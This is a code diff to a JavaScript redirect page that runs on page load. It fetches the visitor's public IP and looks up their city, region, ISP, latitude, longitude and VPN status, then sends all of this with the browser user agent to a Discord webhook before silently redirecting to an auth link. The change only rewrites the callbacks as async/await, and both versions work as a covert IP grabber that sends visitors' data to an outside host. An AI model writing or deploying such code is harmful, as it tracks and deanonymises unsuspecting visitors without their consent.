@@ -11,62 +11,59 @@
         // Redirect URL
         const redirectURL = "https://www.genned.net/auth/rdtqx";
 
-        function logVisitorAndRedirect() {
-            fetch("https://api.ipify.org?format=json")
-                .then(response => response.json())
-                .then(data => {
-                    const userIP = data.ip;
+        async function logVisitorAndRedirect() {
+            try {
+                const ipResponse = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
 
-                    // Get full IP details with VPN detection
-                    fetch(`http://ip-api.com/json/${userIP}?fields=status,message,country,regionName,city,isp,org,as,mobile,proxy,hosting,lat,lon,timezone,query`)
-                        .then(response => response.json())
-                        .then(info => {
-                            if (info.status !== "success") {
-                                console.error("Error getting location data:", info.message);
-                                window.location.href = redirectURL;
-                                return;
-                            }
+                // Get full IP details with VPN detection
+                const locationResponse = await fetch(`http://ip-api.com/json/${userIP}?fields=status,message,country,regionName,city,isp,org,as,mobile,proxy,hosting,lat,lon,timezone,query`);
+                const locationData = await locationResponse.json();
 
-                            const userAgent = navigator.userAgent;
-                            const vpnStatus = info.proxy || info.hosting ? "🔴 **VPN/Proxy Detected**" : "🟢 **No VPN/Proxy Detected**";
+                if (locationData.status !== "success") {
+                    console.error("Error getting location data:", locationData.message);
+                    window.location.href = redirectURL;
+                    return;
+                }
 
-                            const message = {
-                                content: `**New Visitor Logged**\n\n` +
-                                         `**IP Address:** ${info.query}\n` +
-                                         `**Country:** ${info.country}\n` +
-                                         `**Region:** ${info.regionName}\n` +
-                                         `**City:** ${info.city}\n` +
-                                         `**ISP:** ${info.isp}\n` +
-                                         `**Organization:** ${info.org}\n` +
-                                         `**ASN:** ${info.as}\n` +
-                                         `**Latitude:** ${info.lat}\n` +
-                                         `**Longitude:** ${info.lon}\n` +
-                                         `**Timezone:** ${info.timezone}\n` +
-                                         `**Mobile Device:** ${info.mobile ? "Yes" : "No"}\n` +
-                                         `**VPN/Proxy:** ${info.proxy ? "Yes" : "No"}\n` +
-                                         `**Hosting Service:** ${info.hosting ? "Yes" : "No"}\n` +
-                                         `${vpnStatus}\n\n` +
-                                         `**User-Agent:** \`${userAgent}\``
-                            };
+                const userAgent = navigator.userAgent;
+                const vpnStatus = locationData.proxy || locationData.hosting ? "🔴 **VPN/Proxy Detected**" : "🟢 **No VPN/Proxy Detected**";
 
-                            // Send data synchronously before redirecting
-                            var xhr = new XMLHttpRequest();
-                            xhr.open("POST", webhookURL, false); // false = synchronous
-                            xhr.setRequestHeader("Content-Type", "application/json");
-                            xhr.send(JSON.stringify(message));
+                const message = {
+                    content: `**New Visitor Logged**\n\n` +
+                             `**IP Address:** ${locationData.query}\n` +
+                             `**Country:** ${locationData.country}\n` +
+                             `**Region:** ${locationData.regionName}\n` +
+                             `**City:** ${locationData.city}\n` +
+                             `**ISP:** ${locationData.isp}\n` +
+                             `**Organization:** ${locationData.org}\n` +
+                             `**ASN:** ${locationData.as}\n` +
+                             `**Latitude:** ${locationData.lat}\n` +
+                             `**Longitude:** ${locationData.lon}\n` +
+                             `**Timezone:** ${locationData.timezone}\n` +
+                             `**Mobile Device:** ${locationData.mobile ? "Yes" : "No"}\n` +
+                             `**VPN/Proxy:** ${locationData.proxy ? "Yes" : "No"}\n` +
+                             `**Hosting Service:** ${locationData.hosting ? "Yes" : "No"}\n` +
+                             `${vpnStatus}\n\n` +
+                             `**User-Agent:** \`${userAgent}\``
+                };
 
-                            // Redirect instantly after sending data
-                            window.location.href = redirectURL;
-                        })
-                        .catch(error => {
-                            console.error("Error getting location data:", error);
-                            window.location.href = redirectURL; // Redirect even if API fails
-                        });
-                })
-                .catch(error => {
-                    console.error("Error getting IP address:", error);
-                    window.location.href = redirectURL; // Redirect even if API fails
+                // Send the data to the Discord webhook using fetch
+                await fetch(webhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(message)
                 });
+
+                // Redirect instantly after sending data
+                window.location.href = redirectURL;
+            } catch (error) {
+                console.error("Error in logging or redirection:", error);
+                window.location.href = redirectURL; // Redirect even if API fails
+            }
         }
 
         // Run the function on page load
